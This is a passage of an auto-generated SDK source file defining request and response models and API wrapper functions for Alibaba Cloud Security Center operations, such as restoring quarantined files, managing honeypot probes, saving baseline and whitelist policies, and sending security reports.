  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ResetLogShipperResponseBody(name='body'),
}

/**
 * @summary Resets and upgrades the log analysis feature. You can call this operation only when the log analysis feature uses the pay-as-you-go billing method.
 *
 * @param request ResetLogShipperRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ResetLogShipperResponse
 */
async function resetLogShipperWithOptions(request: ResetLogShipperRequest, runtime: Util.RuntimeOptions): ResetLogShipperResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.hotTtl)) {
    query['HotTtl'] = request.hotTtl;
  }
  if (!Util.isUnset(request.logMetaList)) {
    query['LogMetaList'] = request.logMetaList;
  }
  if (!Util.isUnset(request.ttl)) {
    query['Ttl'] = request.ttl;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ResetLogShipper',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Resets and upgrades the log analysis feature. You can call this operation only when the log analysis feature uses the pay-as-you-go billing method.
 *
 * @param request ResetLogShipperRequest
 * @return ResetLogShipperResponse
 */
async function resetLogShipper(request: ResetLogShipperRequest): ResetLogShipperResponse {
  var runtime = new Util.RuntimeOptions{};
  return resetLogShipperWithOptions(request, runtime);
}

model RetryAgentlessTaskRequest {
  taskId?: string(name='TaskId', description='The ID of the task. You can call the [ListAgentlessTask](~~ListAgentlessTask~~) operation to obtain the IDs of tasks.', example='5347c7b6-c85c-4070-846a-3029e08e****'),
}

model RetryAgentlessTaskResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model RetryAgentlessTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: RetryAgentlessTaskResponseBody(name='body'),
}

/**
 * @summary Retries agentless detection tasks.
 *
 * @param request RetryAgentlessTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return RetryAgentlessTaskResponse
 */
async function retryAgentlessTaskWithOptions(request: RetryAgentlessTaskRequest, runtime: Util.RuntimeOptions): RetryAgentlessTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RetryAgentlessTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Retries agentless detection tasks.
 *
 * @param request RetryAgentlessTaskRequest
 * @return RetryAgentlessTaskResponse
 */
async function retryAgentlessTask(request: RetryAgentlessTaskRequest): RetryAgentlessTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return retryAgentlessTaskWithOptions(request, runtime);
}

model RetryInstallProbeRequest {
  probeId?: string(name='ProbeId', description='The probe ID.

>  You can call the [ListHoneypotProbe](~~ListHoneypotProbe~~) operation to query the IDs of probes.', example='c4c47cc1-f60a-4b2f-bcdb-9aed6644****'),
}

model RetryInstallProbeResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4247271-7C31-5A54-9EA1-658D96ED****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model RetryInstallProbeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: RetryInstallProbeResponseBody(name='body'),
}

/**
 * @summary Retry installing the honeypot probe.
 *
 * @param request RetryInstallProbeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return RetryInstallProbeResponse
 */
async function retryInstallProbeWithOptions(request: RetryInstallProbeRequest, runtime: Util.RuntimeOptions): RetryInstallProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RetryInstallProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Retry installing the honeypot probe.
 *
 * @param request RetryInstallProbeRequest
 * @return RetryInstallProbeResponse
 */
async function retryInstallProbe(request: RetryInstallProbeRequest): RetryInstallProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return retryInstallProbeWithOptions(request, runtime);
}

model RollbackSuspEventQuaraFileRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas'),
  quaraFileId?: int32(name='QuaraFileId', description='The ID of the quarantined file.   
> If you do not configure this parameter, you cannot call the RollbackSuspEventQuaraFile operation to restore a quarantined file. You can call the [DescribeSuspEventQuaraFiles](~~DescribeSuspEventQuaraFiles~~) operation to query the IDs of quarantined files.', example='3921797'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.3.4'),
}

model RollbackSuspEventQuaraFileResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='52A3AEE6-114A-499D-8990-4BA9B27FE0AA'),
}

model RollbackSuspEventQuaraFileResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: RollbackSuspEventQuaraFileResponseBody(name='body'),
}

/**
 * @summary Restores a quarantined file.
 *
 * @param request RollbackSuspEventQuaraFileRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return RollbackSuspEventQuaraFileResponse
 */
async function rollbackSuspEventQuaraFileWithOptions(request: RollbackSuspEventQuaraFileRequest, runtime: Util.RuntimeOptions): RollbackSuspEventQuaraFileResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.quaraFileId)) {
    query['QuaraFileId'] = request.quaraFileId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RollbackSuspEventQuaraFile',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Restores a quarantined file.
 *
 * @param request RollbackSuspEventQuaraFileRequest
 * @return RollbackSuspEventQuaraFileResponse
 */
async function rollbackSuspEventQuaraFile(request: RollbackSuspEventQuaraFileRequest): RollbackSuspEventQuaraFileResponse {
  var runtime = new Util.RuntimeOptions{};
  return rollbackSuspEventQuaraFileWithOptions(request, runtime);
}

model SasInstallCodeRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='120.41.XX.XX'),
}

model SasInstallCodeResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='B256A525-7E42-4BB9-A27C-9017FDDFF1A2'),
  data?: string(name='data', description='The installation verification code that is used to run the installation command when you manually install the Security Center agent.', example='eD****'),
}

model SasInstallCodeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SasInstallCodeResponseBody(name='body'),
}

/**
 * @summary Queries the installation verification code that is used to run the installation command of the Security Center agent.
 *
 * @param request SasInstallCodeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SasInstallCodeResponse
 */
async function sasInstallCodeWithOptions(request: SasInstallCodeRequest, runtime: Util.RuntimeOptions): SasInstallCodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SasInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the installation verification code that is used to run the installation command of the Security Center agent.
 *
 * @param request SasInstallCodeRequest
 * @return SasInstallCodeResponse
 */
async function sasInstallCode(request: SasInstallCodeRequest): SasInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return sasInstallCodeWithOptions(request, runtime);
}

model SaveCustomizeReportConfigRequest {
  groupType?: string(name='GroupType', description='The grouping type. Valid values:

*   **ALIYUN_RG**
*   **SAS_GROUP**

>  This parameter is supported only in version 2.0.0.', example='SAS_GROUP'),
  pinnedTime?: long(name='PinnedTime', description='The time when the report is pinned. Unit: milliseconds.

>  This parameter is supported only in version 2.0.0.', example='1717430400000'),
  recipients?: string(name='Recipients', description='The email address of the recipient. Separate multiple email addresses with commas (,).

This parameter is required.', example='xxx@163.com'),
  reportDays?: int32(name='ReportDays', description='The most recent days for report statistics.

>  This parameter is supported only in version 2.0.0.', example='7'),
  reportEndDate?: string(name='ReportEndDate', description='The end date on which the report is sent. The value is in the yyyy-MM-dd format.

>  This parameter is required if the ReportType parameter is set to 3.', example='2024-01-15'),
  reportId?: long(name='ReportId', description='The ID of the report.

>  You can call the [DescribeCustomizeReportList](~~DescribeCustomizeReportList~~) operation to query the ID.', example='123'),
  reportLang?: string(name='ReportLang', description='The language of the report. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  reportSendType?: int32(name='ReportSendType', description='The time range in which the report is sent. Valid values:

*   **1**: 00:00 to 06:00.
*   **2**: 06:00 to 12:00.
*   **3**: 12:00 to 18:00.
*   **4**: 18:00 to 24:00.', example='2'),
  reportStartDate?: string(name='ReportStartDate', description='The start date on which the report is sent. The value is in the yyyy-MM-dd format.

>  This parameter is required if the ReportType parameter is set to 3.', example='2024-01-01'),
  reportStatus?: int32(name='ReportStatus', description='The status of the report. Valid values:

*   **0**: disabled.
*   **1**: enabled.

This parameter is required.', example='1'),
  reportType?: int32(name='ReportType', description='The type of the report. Valid values:

*   **0**: daily report.
*   **1**: weekly report.
*   **2**: monthly report.
*   **3**: report whose statistics are collected within a custom time range.
*   **4**: report of the most recent time range.

This parameter is required.', example='4'),
  reportVersion?: string(name='ReportVersion', description='The version of the report. Valid values:

*   **1.0.0**
*   **2.0.0**', example='2.0.0'),
  sendEndTime?: string(name='SendEndTime', description='The end time at which the report is sent. The value is in the HH:mm:ss format.

>  This parameter is required if the ReportType parameter is set to 0, 1, 2, or 4.', example='10:00:00'),
  sendPeriodDays?: int32(name='SendPeriodDays', description='The exact day within the sending period.

>  This parameter is supported only in version 2.0.0.', example='12'),
  sendPeriodType?: string(name='SendPeriodType', description='The interval at which the report is sent. Valid values:

*   **DAY**
*   **WEEK**
*   **MONTH**

>  This parameter is supported only in version 2.0.0.', example='MONTH'),
  sendStartTime?: string(name='SendStartTime', description='The start time at which the report is sent. The value is in the HH:mm:ss format.

>  This parameter is required if the ReportType parameter is set to 0, 1, 2, or 4.', example='09:00:00'),
  targetGroups?: string(name='TargetGroups', description='The groups.

>  This parameter is supported only in version 2.0.0.', example='12,123'),
  targetUids?: string(name='TargetUids', description='The ID of the Alibaba Cloud account. Separate multiple IDs with commas (,).

>  This parameter is supported only in version 2.0.0.', example='12,123'),
  title?: string(name='Title', description='The title of the report.

This parameter is required.', example='Daily Report'),
}

model SaveCustomizeReportConfigResponseBody = {
  reportId?: long(name='ReportId', description='The ID of the report.', example='123'),
  requestId?: string(name='RequestId', description='The request ID.', example='11472B29-1A1C-5D7F-944B-7CD84319****'),
}

model SaveCustomizeReportConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SaveCustomizeReportConfigResponseBody(name='body'),
}

/**
 * @summary Saves the configurations of a custom security report.
 *
 * @param request SaveCustomizeReportConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SaveCustomizeReportConfigResponse
 */
async function saveCustomizeReportConfigWithOptions(request: SaveCustomizeReportConfigRequest, runtime: Util.RuntimeOptions): SaveCustomizeReportConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupType)) {
    query['GroupType'] = request.groupType;
  }
  if (!Util.isUnset(request.pinnedTime)) {
    query['PinnedTime'] = request.pinnedTime;
  }
  if (!Util.isUnset(request.recipients)) {
    query['Recipients'] = request.recipients;
  }
  if (!Util.isUnset(request.reportDays)) {
    query['ReportDays'] = request.reportDays;
  }
  if (!Util.isUnset(request.reportEndDate)) {
    query['ReportEndDate'] = request.reportEndDate;
  }
  if (!Util.isUnset(request.reportId)) {
    query['ReportId'] = request.reportId;
  }
  if (!Util.isUnset(request.reportLang)) {
    query['ReportLang'] = request.reportLang;
  }
  if (!Util.isUnset(request.reportSendType)) {
    query['ReportSendType'] = request.reportSendType;
  }
  if (!Util.isUnset(request.reportStartDate)) {
    query['ReportStartDate'] = request.reportStartDate;
  }
  if (!Util.isUnset(request.reportStatus)) {
    query['ReportStatus'] = request.reportStatus;
  }
  if (!Util.isUnset(request.reportType)) {
    query['ReportType'] = request.reportType;
  }
  if (!Util.isUnset(request.reportVersion)) {
    query['ReportVersion'] = request.reportVersion;
  }
  if (!Util.isUnset(request.sendEndTime)) {
    query['SendEndTime'] = request.sendEndTime;
  }
  if (!Util.isUnset(request.sendPeriodDays)) {
    query['SendPeriodDays'] = request.sendPeriodDays;
  }
  if (!Util.isUnset(request.sendPeriodType)) {
    query['SendPeriodType'] = request.sendPeriodType;
  }
  if (!Util.isUnset(request.sendStartTime)) {
    query['SendStartTime'] = request.sendStartTime;
  }
  if (!Util.isUnset(request.targetGroups)) {
    query['TargetGroups'] = request.targetGroups;
  }
  if (!Util.isUnset(request.targetUids)) {
    query['TargetUids'] = request.targetUids;
  }
  if (!Util.isUnset(request.title)) {
    query['Title'] = request.title;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SaveCustomizeReportConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Saves the configurations of a custom security report.
 *
 * @param request SaveCustomizeReportConfigRequest
 * @return SaveCustomizeReportConfigResponse
 */
async function saveCustomizeReportConfig(request: SaveCustomizeReportConfigRequest): SaveCustomizeReportConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return saveCustomizeReportConfigWithOptions(request, runtime);
}

model SaveImageBaselineStrategyRequest {
  baselineItemList?: string(name='BaselineItemList', description='The baseline check items.

> You can call the [DescribeImageBaselineStrategy](~~DescribeImageBaselineStrategy~~) operation to query baseline check items.

This parameter is required.', example='ak_leak'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  source?: string(name='Source', description='The data source. If this parameter is left empty, the baseline check policy for images is queried. Valid values:

*   **default**: the baseline check policy for images
*   **agentless**: agentless detection', example='agentless'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.

> You can call the [DescribeImageBaselineStrategy](~~DescribeImageBaselineStrategy~~) operation to query the IDs of baseline check policies.', example='8639'),
  strategyName?: string(name='StrategyName', description='The name of the baseline check policy.', example='default'),
}

model SaveImageBaselineStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='9AB5D3DE-6E0F-5633-AA71-4B90C724****'),
}

model SaveImageBaselineStrategyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SaveImageBaselineStrategyResponseBody(name='body'),
}

/**
 * @summary Saves a baseline check policy for images.
 *
 * @param request SaveImageBaselineStrategyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SaveImageBaselineStrategyResponse
 */
async function saveImageBaselineStrategyWithOptions(request: SaveImageBaselineStrategyRequest, runtime: Util.RuntimeOptions): SaveImageBaselineStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineItemList)) {
    query['BaselineItemList'] = request.baselineItemList;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.strategyName)) {
    query['StrategyName'] = request.strategyName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SaveImageBaselineStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Saves a baseline check policy for images.
 *
 * @param request SaveImageBaselineStrategyRequest
 * @return SaveImageBaselineStrategyResponse
 */
async function saveImageBaselineStrategy(request: SaveImageBaselineStrategyRequest): SaveImageBaselineStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return saveImageBaselineStrategyWithOptions(request, runtime);
}

model SaveSuspEventUserSettingRequest {
  from?: string(name='From', description='The data source of the exception. Set the value to sas.', example='sas'),
  levelsOn?: string(name='LevelsOn', description='The severities of alert notifications. Valid values:

*   **remind**
*   **suspicious**
*   **serious**', example='suspicious,serious,remind'),
}

model SaveSuspEventUserSettingResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AE6229A0-BDBE-534C-A3F8-095EBXXXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model SaveSuspEventUserSettingResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SaveSuspEventUserSettingResponseBody(name='body'),
}

/**
 * @summary Saves alert settings.
 *
 * @param request SaveSuspEventUserSettingRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SaveSuspEventUserSettingResponse
 */
async function saveSuspEventUserSettingWithOptions(request: SaveSuspEventUserSettingRequest, runtime: Util.RuntimeOptions): SaveSuspEventUserSettingResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.levelsOn)) {
    query['LevelsOn'] = request.levelsOn;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SaveSuspEventUserSetting',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Saves alert settings.
 *
 * @param request SaveSuspEventUserSettingRequest
 * @return SaveSuspEventUserSettingResponse
 */
async function saveSuspEventUserSetting(request: SaveSuspEventUserSettingRequest): SaveSuspEventUserSettingResponse {
  var runtime = new Util.RuntimeOptions{};
  return saveSuspEventUserSettingWithOptions(request, runtime);
}

model SaveWhiteListStrategyRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='124.89.XX.XX'),
  strategyId?: long(name='StrategyId', description='The ID of the application whitelist policy.

>  You can call the [DescribeWhiteListStrategyList](~~DescribeWhiteListStrategyList~~) operation to query the ID.', example='8494'),
  strategyName?: string(name='StrategyName', description='The name of the application whitelist policy.

This parameter is required.', example='test'),
  studyTime?: int32(name='StudyTime', description='The duration of intelligent learning. Unit: hours.

This parameter is required.', example='2'),
}

model SaveWhiteListStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='5DFD6277-CC36-57F7-ACE6-F5952XXXX'),
  strategyId?: long(name='StrategyId', description='The ID of the application whitelist policy.', example='8634'),
}

model SaveWhiteListStrategyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SaveWhiteListStrategyResponseBody(name='body'),
}

/**
 * @summary Creates an application whitelist policy.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or enabled the feature, you can call this operation.
 *
 * @param request SaveWhiteListStrategyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SaveWhiteListStrategyResponse
 */
async function saveWhiteListStrategyWithOptions(request: SaveWhiteListStrategyRequest, runtime: Util.RuntimeOptions): SaveWhiteListStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.strategyName)) {
    query['StrategyName'] = request.strategyName;
  }
  if (!Util.isUnset(request.studyTime)) {
    query['StudyTime'] = request.studyTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SaveWhiteListStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates an application whitelist policy.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or enabled the feature, you can call this operation.
 *
 * @param request SaveWhiteListStrategyRequest
 * @return SaveWhiteListStrategyResponse
 */
async function saveWhiteListStrategy(request: SaveWhiteListStrategyRequest): SaveWhiteListStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return saveWhiteListStrategyWithOptions(request, runtime);
}

model SaveWhiteListStrategyAssetsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  operations?: string(name='Operations', description='The operation that you want to perform. This parameter is in the JSON format. The value is case-sensitive. The value contains the following fields:

*   **status**: the operation. Valid values:

    *   **0**: the delete operation.
    *   **1**: the add operation.

*   **target**: the UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to obtain the value of **target** from the response parameter Uuid.

This parameter is required.', example='[{"status":0,"target":"c98dcd24-fa57-4759-b5ec-f8a4ffeed****"}]'),
  relationType?: int32(name='RelationType', description='The type of the policy. Valid values:

*   **1**: learning policy.
*   **2**: application policy.

This parameter is required.', example='1'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='115.193.XX.XX'),
  strategyId?: long(name='StrategyId', description='The ID of the policy.

>  You can call the [DescribeWhiteListStrategyList](~~DescribeWhiteListStrategyList~~) operation to query the ID.

This parameter is required.', example='2730'),
}

model SaveWhiteListStrategyAssetsResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-XXXX'),
}

model SaveWhiteListStrategyAssetsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SaveWhiteListStrategyAssetsResponseBody(name='body'),
}

/**
 * @summary Manages the servers to which an application whitelist policy is applied.
 *
 * @param request SaveWhiteListStrategyAssetsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SaveWhiteListStrategyAssetsResponse
 */
async function saveWhiteListStrategyAssetsWithOptions(request: SaveWhiteListStrategyAssetsRequest, runtime: Util.RuntimeOptions): SaveWhiteListStrategyAssetsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.operations)) {
    query['Operations'] = request.operations;
  }
  if (!Util.isUnset(request.relationType)) {
    query['RelationType'] = request.relationType;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SaveWhiteListStrategyAssets',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Manages the servers to which an application whitelist policy is applied.
 *
 * @param request SaveWhiteListStrategyAssetsRequest
 * @return SaveWhiteListStrategyAssetsResponse
 */
async function saveWhiteListStrategyAssets(request: SaveWhiteListStrategyAssetsRequest): SaveWhiteListStrategyAssetsResponse {
  var runtime = new Util.RuntimeOptions{};
  return saveWhiteListStrategyAssetsWithOptions(request, runtime);
}

model SendCustomizeReportRequest {
  reportId?: long(name='ReportId', description='The ID of the security report.

>  You can call the [DescribeCustomizeReportList](~~DescribeCustomizeReportList~~) operation to query the ID.

This parameter is required.', example='123'),
}

model SendCustomizeReportResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='2BEA397D-1FD0-5C79-AB24-EC051158****'),
}

model SendCustomizeReportResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SendCustomizeReportResponseBody(name='body'),
}

/**
 * @summary Sends a security report to an email address that you specify. You can send only a security report whose statistics are collected in a custom time range.
 *
 * @param request SendCustomizeReportRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SendCustomizeReportResponse
 */
async function sendCustomizeReportWithOptions(request: SendCustomizeReportRequest, runtime: Util.RuntimeOptions): SendCustomizeReportResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.reportId)) {
    query['ReportId'] = request.reportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SendCustomizeReport',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Sends a security report to an email address that you specify. You can send only a security report whose statistics are collected in a custom time range.
 *
 * @param request SendCustomizeReportRequest
 * @return SendCustomizeReportResponse
 */
async function sendCustomizeReport(request: SendCustomizeReportRequest): SendCustomizeReportResponse {
  var runtime = new Util.RuntimeOptions{};
  return sendCustomizeReportWithOptions(request, runtime);
}

model SetBuildRiskDefineRuleConfigRequest {
  config?: string(name='Config', description='The configuration item for scanning image build command risks. Valid values:

*   **classKey**: Set the value to a valid value of the ClassKey parameter in RuleTree.
*   **ruleList**: Set the value to a valid value of the RuleKey parameter in RuleList.

>  You can call the [GetBuildRiskDefineRuleConfig](~~GetBuildRiskDefineRuleConfig~~) operation to query the valid values.', example='[
	{
		"classKey": "other",
		"ruleList": [
			"add",
			"apk"
		]
	}
]'),
}

model SetBuildRiskDefineRuleConfigResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    id?: long(name='Id', description='The configuration ID for scanning image build command risks.', example='1'),
